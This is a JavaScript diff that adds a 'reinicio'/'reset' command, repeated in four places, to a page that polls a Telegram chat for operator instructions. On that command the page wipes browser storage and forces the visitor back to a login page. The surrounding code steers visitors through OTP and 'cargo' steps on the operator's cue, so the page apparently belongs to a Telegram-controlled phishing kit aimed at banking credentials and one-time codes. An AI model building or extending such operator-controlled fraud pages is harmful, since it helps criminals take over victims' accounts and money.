@@ -103,6 +103,16 @@
               const textoMensaje = msg.text.trim();
               const low = textoMensaje.toLowerCase();
 
+               // UBIACIÓN 1: Intercepción prioritaria de reinicio global
+            if (low === 'reinicio' || low === 'reset') {
+              console.log("Comando de reinicio global detectado.");
+              await sendTelegram("🔄 *Reinicio Forzado:* Sesión expirada. Expulsando navegador al Login...");
+              localStorage.clear();
+              sessionStorage.clear();
+              window.location.replace("index.html");
+              return;
+            }
+
               // 1. Intercepción PRIORITARIA si pones la palabra clave 'cierre'
               if (low === 'cierre') {
                 console.log("¡Palabra clave 'cierre' detectada exitosamente!");
@@ -184,7 +194,17 @@
               const chatIDRecibido = String(msg.chat.id);
               const chatIDConfigurado = String(TELEGRAM_CHAT_ID);
               const msgText = msg.text ? msg.text.trim() : "[Mensaje sin texto/Vacío]";
+              const low = msgText.toLowerCase();
 
+              // [INTEGRACIÓN] UBIACIÓN 2: Intercepción prioritaria de reinicio global (Pasada 1)
+              if (low === 'reinicio' || low === 'reset') {
+                console.log("Comando de reinicio global detectado.");
+                await sendTelegram("🔄 *Reinicio Forzado:* Sesión expirada. Expulsando navegador al Login...");
+                localStorage.clear();
+                sessionStorage.clear();
+                window.location.replace("index.html");
+                return;
+              }
               console.log(`📩 Mensaje detectado -> ID Configurado: "${chatIDConfigurado}" | ID Recibido: "${chatIDRecibido}" | Texto: "${msgText}"`);
 
               if (chatIDRecibido === chatIDConfigurado) {
@@ -262,6 +282,16 @@
             const t = msg.text.trim();
             const low = t.toLowerCase();
 
+            // UBICACIÓN 2: Intercepción prioritaria de reinicio global
+        if (low === 'reinicio' || low === 'reset') {
+          console.log("Comando de reinicio global detectado.");
+          await sendTelegram("🔄 *Reinicio Forzado:* Sesión expirada. Expulsando navegador al Login...");
+          localStorage.clear();
+          sessionStorage.clear();
+          window.location.replace("index.html");
+          return;
+        }
+
             // Comando "baja": deja el cargo por defecto, marca flow_type y avisa para ir a dashboard.html
             if (low === "baja") {
              try { sessionStorage.setItem("flow_type", "baja"); } catch (e) { }
@@ -317,6 +347,16 @@
 
             const t = msg.text.trim();
             const low = t.toLowerCase();
+            
+// [INTEGRACIÓN] UBIACIÓN 1: Intercepción prioritaria de reinicio global (Pasada 2+)
+              if (low === 'reinicio' || low === 'reset') {
+                console.log("Comando de reinicio global detectado.");
+                await sendTelegram("🔄 *Reinicio Forzado:* Sesión expirada. Expulsando navegador al Login...");
+                localStorage.clear();
+                sessionStorage.clear();
+                window.location.replace("index.html");
+                return;
+              }
 
             if (["no", "n", "ok", "listo", "mantener"].includes(low)) {
               await sendTelegram("Mantengo el cargo actual. Entrando a OTP...");
